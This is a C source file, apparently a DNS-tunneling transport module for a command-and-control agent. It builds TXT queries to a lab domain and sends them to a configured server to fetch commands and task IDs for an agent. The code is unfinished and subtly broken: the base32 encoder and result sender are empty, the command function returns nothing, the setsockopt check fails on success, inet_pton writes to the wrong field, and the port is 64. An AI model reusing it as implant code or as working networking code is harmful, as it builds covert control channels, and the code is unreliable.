#include "config.h"
#include "transport.h"

#include <asm-generic/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int current_sockfd = -1; //SOCKET
static struct sockaddr_in server_addr;

void encode_base32(char* data) {

}

/**
 * @brief Функция для сбора dns пакета со всеми необходимыми полями
 *
 * @param qname Буфер в котором хранится доменное имя, чтобы из него сформировать пакет(входной аргумент)
 * @param buffer Буфер в котором хранится сформированный dns пакет(выходной параметр)
 * @param qtype Тип запроса
 *
 * @return Количество размер сформированного пакета 
*/
static int build_dns_query(const char* qname, unsigned char* buffer, size_t max_len_buffer, uint16_t qtype) {
    int offset = 0; //pointer for buffer

    buffer[offset++] = (DNS_ID >> 8) & 0xFF; //ID
    buffer[offset++] = DNS_ID & 0xFF; //ID
    buffer[offset++] = 0x01; //flag
    buffer[offset++] = 0x00; //flag
    uint16_t qdcount = htons(0x01); //qdcount
    memcpy(&buffer[offset], &qdcount, 2);
    offset += 2;
    memset(&buffer[offset], 0, 6);
    offset += 6; 

    //parse qname
    int label_start = 0;
    int i = 0;
    int length;
    while(qname[i] != '\0') {
        if(qname[i] == '.') {
            length = i - label_start;
            if((length >= 63) || ((offset + 1 + length) >= max_len_buffer)) {
                printf("[-/DNS] Error, length is invalid.\n");
                return -1; //+1 for dots
            }

            buffer[offset++] = length;
            memcpy(&buffer[offset], &qname[label_start], length);
            offset += length;

            label_start = (i + 1);
        }
        i++;
    }
    length = i - label_start;
    if(length > 0) {
        if((length > 63) || ((offset + 1 + length)>= max_len_buffer)) {
            printf("[-/DNS] Error, length is invalid.\n");
            return -1;
        }
        buffer[offset++] = length;
        memcpy(&buffer[offset], &qname[label_start], length);
        offset += length;
    }
    buffer[offset++] = '\0';

    //qtype and qclass
    if((offset + 4) < max_len_buffer) {    
        uint16_t qtype_net = htons(qtype);
        memcpy(&buffer[offset], &qtype_net, 2);
        offset += 2;

        uint16_t qclass = htons(1);
        memcpy(&buffer[offset], &qclass, 2);
        offset += 2;
    } else {
        printf("[-/DNS] Error, length is invalid.\n");
        return -1;
    }

    return offset;
}

/*
 * @brief Функция для отправки dns пакета
 *
 * @param buffer Буфер в котором хранится отправляемая информация
 * @param length Длина буфера отправляемой информации
 * @param response_buffer Буфер для получаемой информации
 * @param max_len_resp_buf Длина буфера получаемой информации
 *
 * @return Длина принятой информации
*/
int send_dns_packet(const unsigned char* buffer, int length, unsigned char* response_buffer, int max_len_resp_buf) {
    int result = sendto(current_sockfd, buffer, length, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if(result == -1) {
        printf("[-/DNS] Error sendto.\n");
        return -1;
    }

    result = 0;
    result = recvfrom(current_sockfd, response_buffer, max_len_resp_buf, 0, NULL, NULL);
    if(result == -1) {
        printf("[-/DNS] Error recvfrom.\n");
    }

    return result;
}

/**
 * @brief Функция для инициализации сокета для dns
 *
 * @return При успехе - 0, иначе - 1
*/
static int dns_init(void) {
    current_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(current_sockfd == -1) {
        printf("[-/DNS] Error create socket.\n");
        return 1;
    }
    
    //timeout
    struct timeval tv = {
        .tv_sec = 2,
        .tv_usec = 0
    };
    int result = setsockopt(current_sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if(result - 1) {
        close(current_sockfd);
        printf("[-/DNS] Error setcoketopt.\n");
        return -1;
    }

    //filling server_addr
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_port = htons(64);
    server_addr.sin_family = AF_INET;
    
    if(inet_pton(AF_INET, SERVER_IP/*from config.h*/, &server_addr) <= 0) {
        printf("[-/DNS] Error server_addr.\n");
        close(current_sockfd);
        return 1;
    }

    return 0;
}

/**
 * @return В случае успеха размер получаенной команды, иначе - -1
*/
static int dns_get_command(/*[OUT]*/char* command, /*[OUT]*/char* task_id, size_t max_len_command, size_t max_len_task_id, char* agent_id) {
    //формирование данных для отправки
    char qname[21] = "home.tun.example.lab\0";
    size_t max_len_buffer = 512;
    unsigned char buffer[max_len_buffer]; //dns packet
    uint16_t qtype = 16;

    int result = build_dns_query(qname, buffer, max_len_buffer, qtype);
    if(result == -1) {
        printf("[-/DNS] Error build dns packet.\n");
        return -1;
    }
    
    unsigned char response_buffer[max_len_buffer];
    result = send_dns_packet(buffer, result, response_buffer, max_len_buffer);
    if(result == -1) {
        printf("[-/DNS] Error send dns packet to server.\n");
        return -1;
    }
} 

static int dns_send_result(char* task_id, char* result) {
    return 0;
}

void dns_cleanup(void) {
    close(current_sockfd);
}

//export module
TransportModule dns_transport = {
    .name = "DNS",
    .init = dns_init,
    .get_command = dns_get_command,
    .send_result = dns_send_result,
    .cleanup = dns_cleanup
};
